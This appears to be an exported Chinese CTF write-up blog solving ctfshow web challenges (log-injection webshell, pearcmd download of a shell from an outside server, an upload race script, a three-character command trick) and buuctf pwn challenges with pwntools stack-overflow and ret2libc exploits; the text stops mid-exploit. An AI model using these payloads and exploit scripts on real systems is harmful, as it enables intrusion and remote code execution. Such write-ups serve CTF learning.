<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web16/9%7DJEPAH%60O%24O62C7%29003%29S86.png" alt=""><br>
所以我们再构造成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;36d</span><br></pre></td></tr></table></figure>
<p>即可获得flag</p>
<h3 id="web17"><a class="header-anchor" href="#web17">¶</a>web17</h3>
<p>打开题目，终于换一个系列了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/8Z9%29%28_5UFERE%5DI6BQXG9%60PN.png" alt=""><br>
把php都过滤了QWQ，抓包看看<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/%5BL%40GU%28%60N%4024QW%25%7B9%7D%25%7BZB4C.png" alt=""><br>
没发现什么东西，这里看见用的中间件是nginx，那就去尝试读取看一下日志，看看能不能成功<br>
nginx默认日志位置：/var/log/nginx/access.log<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/AH%25%7DV5%5DVIC%7B4521~TR%29L12T.png" alt=""><br>
发现读取成功，那就进行日志注入，再次抓包传马过去<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/%40AD0VZ4X%60I%5B%242BE_%7BTK%28L%29P.png" alt=""><br>
用蚁剑进行连接<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/AA88TO%5BG%60%5BRE3%25CRTCQQPRV.png" alt=""><br>
连接成功后，再36d.php文件中找到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/TZ83A0AQ%2821%407%5D~%40C%60%295ZTS.png" alt=""></p>
<h3 id="web18-21"><a class="header-anchor" href="#web18-21">¶</a>web18-21</h3>
<p>使用web17的方法都可以解决</p>
<h3 id="web22"><a class="header-anchor" href="#web22">¶</a>web22</h3>
<p>打开环境，发现这次会在后面自动加上.php结尾<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/O%29LZC%5B%24T%408RQ3GU2WJ%4001GO.png" alt=""><br>
然后这次用日志注入的话也行不通，可能给的权限不够了，所以我们另寻出路<br>
在低版本php中，会默认开启一个register_argc_argv配置</p>
<blockquote>
<p>register_argc_argv是通过GET请求方法类似于参数传递给可执行文件，$argc是用于记录数组大小，$argv是用于记录输入的参数</p>
</blockquote>
<p>这里用“+”号进行分割，就可以操纵argv的参数个数<br>
首先，我们需要在自己的服务器上建一个php文件，先用phpinfo测试能不能成功<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/7Y8BM%60%25B7%5B%5BX2R6UERMOCND.png" alt=""><br>
然后开始构造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;pearcmd&amp;+download+http:&#x2F;xx.xx.xx.xx&#x2F;shell.php</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/5OLUOC%2932B_%24PXP69O9DWNQ.png" alt=""><br>
然后再访问<code>http://41b52ef5-6be1-4210-a42c-cab5937677a7.chall.ctf.show/shell.php</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/%5BJJ%7BKC%28%28%5D%60%60K~~5OE72C2CI.png" alt=""><br>
发现能成功访问😏<br>
那我们再把shell.php内容改一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/U0BUPFME%5DO2M7AY%40P8MXSFC.png" alt=""><br>
再请求一次，然后访问shell.php，看到文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/~%28IZ5SOVV%25O4TM%24D%28SIFW7C.png" alt=""><br>
那我们直接把shell.php直接改成<code>tac 36d.php</code>，然后就能拿到flag了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/J%24RG%7DA~%5B6G8PHJY5J~8S9U0.png" alt=""></p>
<h3 id="web23"><a class="header-anchor" href="#web23">¶</a>web23</h3>
<p>打开网站，发现是文件上传<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web23-24/76A%2573%5D%606L7W%280%7BW6_JC72S.png" alt=""><br>
直接抓包传个一句话木马试试<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web23-24/%60TEP_COCU%25MO%5BKYCHFIROKC.png" alt=""><br>
啊这，上传成功了~这么简单吗，哼哼，访问一下我的马儿🐴<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web23-24/DVKE%4037%7DJY%60%7D7SMVD7%5BD7MI.png" alt=""><br>
403？？咋会没有，重新传了几次，发现访问还是403，擦，不会源码有个删马功能吧，上传就会把我的🐴给删了，那我就写个脚本传死你</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># Author：dota_st</span></span><br><span class="line"><span class="comment"># Date ：2021/1/25 11:58</span></span><br><span class="line"><span class="comment"># Tool ：PyCharm</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line">url = <span class="string">&quot;http://ad17eb37-7528-4ee4-bd09-6285147189e5.chall.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell_php</span>(<span class="params">fname</span>):</span></span><br><span class="line">    qingqiu = requests.get(url + <span class="string">&quot;uploads/&quot;</span> + fname + <span class="string">&quot;.php&quot;</span>, headers=&#123;<span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span>&#125;)</span><br><span class="line">    result = qingqiu.text</span><br><span class="line">    <span class="keyword">if</span> (len(result) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="string">&quot;404 Not Found&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> result <span class="keyword">and</span> <span class="string">&quot;容器已过期&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> result):</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Thread_fun</span>(<span class="params">fun, *args</span>):</span></span><br><span class="line">    pool = threadpool.ThreadPool(<span class="number">7</span>)</span><br><span class="line">    requests = threadpool.makeRequests(fun, args)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> requests]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Thread_start</span>(<span class="params">fname</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">400</span>):</span><br><span class="line">        Thread_fun(shell_php, fname + str(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_php</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_data = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&quot;&lt;?php system(\&quot;ls ../\&quot;);?&gt;&quot;</span>)&#125;</span><br><span class="line">        r = requests.post(url+<span class="string">&quot;upload.php&quot;</span>, files=file_data, headers=&#123;<span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span>&#125;)</span><br><span class="line">        txt = r.text</span><br><span class="line">        print(<span class="string">&quot;uploaded:&quot;</span>, txt)</span><br><span class="line">        ts = int(time.mktime(time.strptime(txt[<span class="number">8</span>:<span class="number">22</span>], <span class="string">&quot;%Y%m%d%H%M%S&quot;</span>)))</span><br><span class="line">        file_name = time.strftime(<span class="string">&quot;%Y%m%d%H%M%S&quot;</span>, time.localtime(ts + <span class="number">1</span>))</span><br><span class="line">        Thread_start(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    upload_php()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web23-24/0T775A3%7DTRP4BR0%7DW%28_S%5BK0.png" alt=""><br>
看到目录下有flaghere0.txt，我们把源码中的<code>ls ../</code>改成<code>tac ../flaghere0.txt</code>即可，然后再运行一遍<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web23-24/%7DYAD%7BR7%245%7BTWMS3O%40AN6431.png" alt=""><br>
得到flag😎</p>
<h3 id="web-24"><a class="header-anchor" href="#web-24">¶</a>web 24</h3>
<p>按照题目提示把源码中的随机数改成(0,300)，时间改成3即可，运行得到flag</p>
<h3 id="获得百分之百的快乐"><a class="header-anchor" href="#获得百分之百的快乐">¶</a>获得百分之百的快乐</h3>
<p>打开题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;hack!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//by Firebasky</span></span><br><span class="line"><span class="comment">//by Firebasky </span></span><br></pre></td></tr></table></figure>
<p>限制长度为4以下的命令执行，我们先构成<code>?1=ls</code>查看一下有什么文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/EO%60%5BGUYLPTKYUYEWAL4E%289D.png" alt=""><br>
发现文件名有s和z开头的，想到最短的命令就是nl命令，nl可以输出文件内容和行号，那只有三个字符长度如何读取secretsecret_ctfshow_36dddddddddd.php中的flag呢？<br>
我们先去kali走一遍，说说原理：<br>
首先使用&gt;可以生成一个文件，我们这里使用<code>&gt;s</code>生成一个空的文件名为s的文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/0%5BVI%6065%7BCX434Q_~DFS893O.png" alt=""><br>
然后往s中写入abc三个字符后，使用<code>nl s</code>输出试试，输出结果为带行号的s文件内容<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/Y8AL~V%7BFZQ5%25%5B%7B8R5R6Y%243U.png" alt=""><br>
我们再使用<code>&gt;nl</code>生成nl为文件名的文件，然后使用<code>*</code>通配符<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/ME%25%28LK%256E%60Q%7BN_LGN2J3_JV.png" alt=""><br>
发现会把abc的文件内容也读取成功了，这是因为*会把ls出来的一串文件名按ls的顺序读取成一个字符串，然后当做命令执行，也就变成了&quot;nl s&quot;，变成了一个nl命令<br>
所以这道题的pyload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;&gt;nl</span><br><span class="line">?1&#x3D;*</span><br><span class="line">#还有另一个命令od（八进制输出）也是可以的</span><br></pre></td></tr></table></figure>
<p>然后再源码中就可以看到flag了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/%24NA%24%7B4AR%7BMGLJT3%24JG~08%5DE.png" alt=""></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf平台pwn刷题WP</title>
    <url>/posts/6613/</url>
    <content><![CDATA[<h2 id="test-your-nc"><a class="header-anchor" href="#test-your-nc">¶</a>test_your_nc</h2>
<p>没啥好说的，nc 连接上去之后读取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc node4.buuoj.cn 27874</span><br><span class="line"></span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>
<h2 id="rip"><a class="header-anchor" href="#rip">¶</a>rip</h2>
<h3 id="知识点：栈溢出，ret2text"><a class="header-anchor" href="#知识点：栈溢出，ret2text">¶</a>知识点：栈溢出，ret2text</h3>
<p>先用 checksec 检查一下程序<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/rip/%40W3I8USI%7D3TK%297O2FSRADUM.png" alt=""><br>
没有开启任何保护，放到 ida 中按 F5 分析伪代码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/rip/2BUEKW5650%25%7DUAD7216N%2459.png" alt=""><br>
看见典型的 gets 函数导致栈溢出，<code>gets</code>函数是一个危险函数。因为它不检查输入的字符串长度，而是以回车来判断结束，因此容易导致栈溢出漏洞的产生。<br>
双击 s，可以看到偏移量为<code>0x8-(-0xF)</code>，即 8+15=23。接着观察到程序已经预留一个后门函数<code>fun</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/rip/T%25NRG%25J9V4NV56W%5D41%25%40%7D35.png" alt=""><br>
所以我们只需要覆盖返回地址为后门函数即可，fun 函数地址也可以在 ida 中观察得到：0x401186<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/rip/0ZR%40NB~%24DFSCP7E9I7DAIZS.png" alt=""><br>
编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29798</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">23</span> + p64(<span class="number">0x401186</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>但是运行失败，因为远程环境是 ubuntu18，64位的程序则需要考虑堆栈平衡的问题，我们可以通过加一个 ret 指令去使其16字节对齐，寻找程序中 ret 的地址<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/rip/%243%29Y%25%5D%40%7BX%7D8QCU%7D_HQMJG%5DD.png" alt=""><br>
用 <strong>ROPgadget</strong> 找到 ret 的地址为：0x401016，所以最终exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29798</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">23</span> + p64(<span class="number">0x401016</span>) +p64(<span class="number">0x401186</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="warmup-csaw-2016"><a class="header-anchor" href="#warmup-csaw-2016">¶</a>warmup_csaw_2016</h2>
<h3 id="知识点：栈溢出，ret2text-v2"><a class="header-anchor" href="#知识点：栈溢出，ret2text-v2">¶</a>知识点：栈溢出，ret2text</h3>
<p>首先用 checksec 检查没有任何保护，并且是64位程序，丢进 ida 中查看伪代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4u</span>LL);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9u</span>LL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> gets(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>典型的 gets 函数栈溢出，双击 v5 查看偏移<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/warmup_csaw_2016/UOH6%604ZN8H4T3%24NA%28J%24DIDY.png" alt=""><br>
同时可以在 sub_40060D 函数中发现有获取flag的命令</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40060D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28169</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>) + p64(<span class="number">0x40060d</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2019-n-1"><a class="header-anchor" href="#ciscn-2019-n-1">¶</a>ciscn_2019_n_1</h2>
<h3 id="知识点：栈溢出，覆盖变量值"><a class="header-anchor" href="#知识点：栈溢出，覆盖变量值">¶</a>知识点：栈溢出，覆盖变量值</h3>
<p>用 checksec 检测是64位程序，且只开了 NX 保护，在 ida 中查看伪代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果 v2 的值等于浮点数的 11.28125，而 v1 存在栈溢出，解题思路就是通过 v1 进行栈溢出，改写 v2 的值。观察栈<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_n_1/~1NU%24C3I4BNV9HQSV%7BD7%5DWA.png" alt="">可以看到 v1 在栈中的空间大小为 <strong>0x30-0x4=44</strong>，同时注意使用 p64 打包的时候只能打包整数，小数不可以，所以需要将 11.28125 转换为16进制的形式，在ida中也可以看到<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_n_1/SCOVYC%5B4BL%25W5JM%40WZ7ZV%24X.png" alt=""><br>
编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29515</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span><span class="number">-0x4</span>) + p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="pwn1-sctf-2016"><a class="header-anchor" href="#pwn1-sctf-2016">¶</a>pwn1_sctf_2016</h2>
<h3 id="知识点：栈溢出ret2text"><a class="header-anchor" href="#知识点：栈溢出ret2text">¶</a>知识点：栈溢出ret2text</h3>
<p>用 checksec 检查程序为32位，只开启了 NX 保护，丢进 ida 中查看伪代码，跟进 vuln 函数<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/pwn1_sctf_2016/%5BIELG_U6LX%25%25H74%25F6A%60S81.png" alt=""><br>
已经很明了，虽然只限制读入32个字节数据，但可以通过 <strong>I</strong> 变成 <strong>you</strong> 实现一个长度的字节变成三个长度的字节，导致栈溢出。双击 s<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/pwn1_sctf_2016/W3%282C%5B%7DK_4%7D%29%5B7G%7BSZH3WD6.png" alt="">可以看到 s 的栈空间为 0x3c，也就是60字节，60÷3=20，需要输入20个 I 即可填满栈空间，然后再用4个字节来覆盖ebp，加上返回地址，一共20+4=28，满足小于 32 长度的限制。点击 get_flag 即可看到该函数地址为 0x8048F0D，开始编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27160</span>)</span><br><span class="line">payload = <span class="string">&#x27;I&#x27;</span>*<span class="number">20</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(<span class="number">0x8048F0D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj-level0"><a class="header-anchor" href="#jarvisoj-level0">¶</a>jarvisoj_level0</h2>
<h3 id="知识点：栈溢出，ret2text-v3"><a class="header-anchor" href="#知识点：栈溢出，ret2text-v3">¶</a>知识点：栈溢出，ret2text</h3>
<p>checksec 检查程序为64位程序，导入 ida 查看伪代码，跟进 vulnerable_function</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看见 buf 分配的栈空间大小只有 0x80，也就是128，而read可以输入200长度数据，导致栈溢出，后门函数地址为0x400596<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/jarvisoj_level0/%287%40J%5BVLHP0IFF%7BEH0%28%40Y5BV.png" alt=""><br>
编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26330</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">128</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2019-c-1"><a class="header-anchor" href="#ciscn-2019-c-1">¶</a>ciscn_2019_c_1</h2>
<h3 id="知识点：栈溢出，ret2libc3"><a class="header-anchor" href="#知识点：栈溢出，ret2libc3">¶</a>知识点：栈溢出，ret2libc3</h3>
<p>相关知识可以看我的另一篇博文：<code>https://www.wlhhlc.top/posts/54640/#无system-无-bin-sh</code></p>
<p>首先，checksec 检查程序为64位，且只开启了 NX 保护，丢进ida中观察伪代码，跟进 encrypt 函数<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_c_1/0W%5DX7%7BPI5~VG%28DIJWB%25GJS1.png" alt="">典型的栈溢出漏洞，双击变量s<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_c_1/Y%25EITOQT~%7B%294HFHG1R457DO.png" alt="">栈空间大小为0x50，但程序中没有 system 和 sh，所以需要我们去泄露 puts 函数的真实地址，从而确定 libc 版本，进而知道其他函数的地址，因为64位传参的约定，我们还需要找 rdi 寄存器的地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &quot;ret|pop&quot; | grep &quot;rdi&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_c_1/H_BSOXBZ0%28P%5DJ%5DA%5BO034EG5.png" alt=""><br>
rdi寄存器地址为：0x0000000000400c83，编写exp泄露libc版本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25051</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x0000000000400c83</span></span><br><span class="line">payload_1 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>) + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your choice!&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>,payload_1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">success(hex(puts_addr))</span><br></pre></td></tr></table></figure>
<p>运行后得到 puts 函数的地址：0x7f0ee53849c0<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_c_1/B_BZHP6D~OPCF%7B%25_2XD056X.png" alt="">取后三位，去这个网站查 libc 版本：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_c_1/28QMMTK419AKSAL%5BP%7BXXW0P.png" alt="">下载下来后，用 one_gadget 搜索 execve 地址，随意选一个地址<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/ciscn_2019_c_1/FDUWD_NRI%60%5B69CR%7B68FXFPC.png" alt=""><br>
接着编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25051</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x0000000000400c83</span></span><br><span class="line">payload_1 = <span 